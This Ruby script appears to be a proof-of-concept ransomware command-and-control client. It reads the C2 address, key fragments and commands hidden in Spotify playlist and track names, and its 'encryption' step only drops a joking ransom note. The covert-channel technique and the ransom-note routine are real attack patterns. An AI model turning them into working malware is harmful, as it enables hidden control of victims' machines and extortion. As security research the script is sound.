#!/usr/bin/ruby
#Libraries
require 'rspotify'
require 'colorize'

# !!! API Key Required !!!
client_id = ""
client_secret = ""
tainted_user = "mauroeldritch"
tainted_playlist = ""

#Attack Routine
puts "Attempting to connect to Spotify..."
RSpotify::authenticate(client_id, client_secret)
me = RSpotify::User.find("#{tainted_user}")
ps = me.playlists
puts "Searching for tainted C2 playlist..."
id, ip, key_a, key_b, key_c = ""
ps.each do |p|
    if p.name.to_s.include? "Hits"
        decoded = p.name.split(" ")
        id = p.id
        puts "Found tainted playlist: #{id}.".light_red
        ip = decoded[1]
        key_a = decoded[2]
        key_b = p.description
        key_c = decoded[3]
        break
    end
end
puts "Reading commands..."
ps = RSpotify::Playlist.find("#{tainted_user}", "#{tainted_playlist}")
#command_identifiers = ["SEQ_START", "set_key", "leak_info",     "crypt_start", "SEQ_END", "incompleted",                           "SEQ_WAIT", "del_shadow_copies"]
command_identifiers =  ["So Alive",  "Fix",     "Bait & Switch", "Tank!",       "Adios",   "I Started Something I Couldn't Finish", "Asleep",   "Two Shadows"]
ps.tracks.each do |command|
    if command.name.match?(Regexp.union(command_identifiers))
        order =  command.name.to_s
        case order
        when /So Alive/
            puts "Received SEQ_START".light_blue
            puts "Identified C2: #{ip.gsub("-",".")}".light_blue
        when /Fix/
            puts "Recovered Key: #{("ssh-rsa " + key_a + key_b + key_c).gsub("&amp;amp;#x2F;","/") + " #{tainted_user}@crypt"}".light_yellow
        when /Bait & Switch/
            puts "No information to leak. Host will not be enrolled.".light_blue
        when /Tank!/
            puts "Starting encryption cycle...".light_red
            begin
                desktop = ""
                if Dir.exist?(File.expand_path('~') + "/Desktop")
                    desktop = "#{File.expand_path('~')}/Desktop"
                elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                    desktop = "#{File.expand_path('~')}/Escritorio"
                else
                    desktop = "/tmp"
                end
                File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                ""
            rescue => e
                puts "Exception: #{e}"
                "Error: Failed to run supplied command."
            end
        when /Adios/
            puts "Received SEQ_END".light_blue
        when /I Started Something/
            puts "Warning: Some previous jobs were interrupted".light_yellow
        when /Asleep/
            puts "Received SEQ_WAIT".light_blue
        else
            "Bad Response"
        end
    end
end